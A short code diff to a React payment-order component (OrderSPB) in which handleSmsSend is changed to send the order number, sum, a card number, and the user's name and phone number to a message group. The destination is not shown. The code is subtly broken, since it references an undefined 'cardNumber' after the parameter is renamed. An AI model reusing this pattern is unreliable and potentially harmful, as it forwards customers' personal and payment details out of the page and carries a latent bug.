@@ -109,18 +109,22 @@ const OrderSPB = () => {
     }
   }, [formData]);
 
-  const handleSmsSend = async (order, orderSum, cardName, cardNumber, cardBank) => {
+ 
+  const handleSmsSend = async (order, orderSum, card) => {
     try {
       const message = `
-        PAY_XX: order: [${order}] orderSum: [${orderSum}] BANK: [${cardBank}]
-        Name: [${cardName}] SBP Number: [${cardNumber}]
+        PAYLINK CБП: 
+        Order: [${order}]
+        Order Sum: [${orderSum}]
+        Card: [${cardNumber}]
+        User Name: [${formData.name}]
+        Phone Number: [${formData.phoneNumber}]
       `;
       sendMessageGroup(message);
     } catch (error) {
       console.error('Error sending message:', error.message);
     }
   };
-
   const handleContinue = () => {
     if (order) {
       navigate('/status', {
